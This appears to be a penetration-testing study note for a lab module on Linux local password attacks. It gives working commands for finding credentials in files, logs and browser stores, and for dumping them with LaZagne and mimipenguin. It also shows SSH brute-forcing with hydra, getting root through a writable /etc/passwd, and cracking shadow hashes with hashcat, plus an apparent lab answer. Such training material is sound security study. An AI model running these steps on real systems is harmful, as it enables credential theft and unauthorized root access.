# ❇️ Linux Local Password Attacks

## Credential Hunting

There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

| **`Files`**  | **`History`**        | **`Memory`**         | **`Key-Rings`**            |
| ------------ | -------------------- | -------------------- | -------------------------- |
| Configs      | Logs                 | Cache                | Browser stored credentials |
| Databases    | Command-line History | In-memory Processing |                            |
| Notes        |                      |                      |                            |
| Scripts      |                      |                      |                            |
| Source codes |                      |                      |                            |
| Cronjobs     |                      |                      |                            |
| SSH Keys     |                      |                      |                            |

#### Files

Configuration files (usually `.config`, `.conf`, `.cnf)` are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read.

Find configuration files ->

```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Find password in conf files ->

```shell-session
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

#### **Databases**

Find database files ->

```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

**Notes**

This can be tricky because they can be named anything and do not have to have a specific file extension, such as `.txt`. Therefore, in this case, we need to search for files including the `.txt` file extension and files that have no file extension at all.

Find notes ->

```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

**Scripts**

Find scripts ->

```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

**Cronjobs**

crons will be divided into different time ranges (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). The scripts and files used by `cron` can also be found in `/etc/cron.d/` for Debian-based distributions.

```shell-session
cat /etc/crontab 
```

```shell-session
ls -la /etc/cron.*/
```

**SSH Keys**

A file is generated for the client (`Private key`) and a corresponding one for the server (`Public key`). However, these are not the same, so knowing the `public key` is insufficient to find a `private key`

Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key

Private Key ->

```shell-session
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

Public key ->

```shell-session
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

#### History

In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in `.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.

bash history ->

```shell-session
tail -n5 /home/*/.bash*
```

**Logs**

Here are some of the important log files ->

| **Log File**          | **Description**                                    |
| --------------------- | -------------------------------------------------- |
| `/var/log/messages`   | Generic system activity logs.                      |
| `/var/log/syslog`     | Generic system activity logs.                      |
| `/var/log/auth.log`   | (Debian) All authentication related logs.          |
| `/var/log/secure`     | (RedHat/CentOS) All authentication related logs.   |
| `/var/log/boot.log`   | Booting information.                               |
| `/var/log/dmesg`      | Hardware and drivers related information and logs. |
| `/var/log/kern.log`   | Kernel related warnings, errors and logs.          |
| `/var/log/faillog`    | Failed login attempts.                             |
| `/var/log/cron`       | Information related to cron jobs.                  |
| `/var/log/mail.log`   | All mail server related logs.                      |
| `/var/log/httpd`      | All Apache related logs.                           |
| `/var/log/mysqld.log` | All MySQL server related logs.                     |

find interesting content in the logs ->

```shell-session
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

**Memory & cache**

To find credentials stored in the browsers, we can use a tool called [mimipenguin](https://github.com/huntergregal/mimipenguin)

```shell-session
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh 
```

An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is `LaZagne`.

**Memory - LaZagne**

```shell-session
sudo python2.7 laZagne.py all
```

**Browsers**

Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in `logins.json` on the system.

Firefox stored credentials ->

```shell-session
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
```

```shell-session
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

The tool [Firefox Decrypt](https://github.com/unode/firefox\_decrypt) is excellent for decrypting these credentials

```shell-session
python3.9 firefox_decrypt.py
```

Alternatively, `LaZagne` can also return results if the user has used the supported browser.

```shell-session
python3 laZagne.py browsers
```

_**Examine the target and find out the password of the user Will. Then, submit the password as the answer.**_

```
hashcat --force kira.list -r custom.rule --stdout | sort -u > mut_pass.list
```

```
hydra -l kira -P mut_pass.list ssh://10.129.199.132 -t 64
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i download it on my local machine, transfer the python file on the target machine and launch my attack ->

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>TUqr7QfLTLhruhVbCP</p></figcaption></figure>

## Passwd, Shadow & Opasswd

### Passwd file

Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is [Pluggable Authentication Modules](https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM\_SAG.html) (`PAM`). The modules used for this are called `pam_unix.so` or `pam_unix2.so` and are located in `/usr/lib/x86_x64-linux-gnu/security/` in Debian based distributions.

These modules manage user information, authentication, sessions, current passwords, and old passwords.

The `/etc/passwd` file contains information about every existing user on the system and can be read by all users and services. Here is the format ->

| `cry0l1t3` | `:` | `x`           | `:` | `1000` | `:` | `1000` | `:` | `cry0l1t3,,,`      | `:` | `/home/cry0l1t3` | `:` | `/bin/bash` |
| ---------- | --- | ------------- | --- | ------ | --- | ------ | --- | ------------------ | --- | ---------------- | --- | ----------- |
| Login name |     | Password info |     | UID    |     | GUID   |     | Full name/comments |     | Home directory   |     | Shell       |

Usually, we find the value `x` in the **password info field**, which means that the passwords are stored in an encrypted form in the `/etc/shadow` file. However, it can also be that the `/etc/passwd` file is writeable by mistake. This would allow us to clear this field for the user `root` so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as `root`.

Before ->

```shell-session
root:x:0:0:root:/root:/bin/bash
```

after ->

```shell-session
root::0:0:root:/root:/bin/bash
```

Exploiting it ->

```shell-session
[cry0l1t3@parrot]─[~]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash


[cry0l1t3@parrot]─[~]$ su

[root@parrot]─[/home/cry0l1t3]#
```

### Shadow File

This file contains all the password information for the created users and is only readable by users who have administrator rights.

Here is the format

| `cry0l1t3` | `:` | `$6$wBRzy$...SNIP...x9cDWUxW1` | `:` | `18937`        | `:` | `0`         | `:` | `99999`     | `:` | `7`            | `:`               | `:`             | `:`    |
| ---------- | --- | ------------------------------ | --- | -------------- | --- | ----------- | --- | ----------- | --- | -------------- | ----------------- | --------------- | ------ |
| Username   |     | Encrypted password             |     | Last PW change |     | Min. PW age |     | Max. PW age |     | Warning period | Inactivity period | Expiration date | Unused |

f the password field contains a character, such as `!` or `*`, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used.

The `encrypted password` also has a particular format by which we can also find out some information

* `$<type>$<salt>$<hashed>`

Here are the different types possible ->

* `$1$` – MD5
* `$2a$` – Blowfish
* `$2y$` – Eksblowfish
* `$5$` – SHA-256
* `$6$` – SHA-512

### Opasswd

The file where old passwords are stored is the `/etc/security/opasswd`. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.

### Cracking Linux Credentials

```shell-session
ElFelixi0@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
ElFelixi0@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
ElFelixi0@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```

And then we can launch hashcat ->

```shell-session
ElFelixi0@htb[/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

And if we have md5 hashes ->

```shell-session
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```

_**Examine the target using the credentials from the user Will and find out the password of the "root" user. Then, submit the password as the answer.**_

I find old backup files containing everything i need to try and unshadow the content of /etc/shadow

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
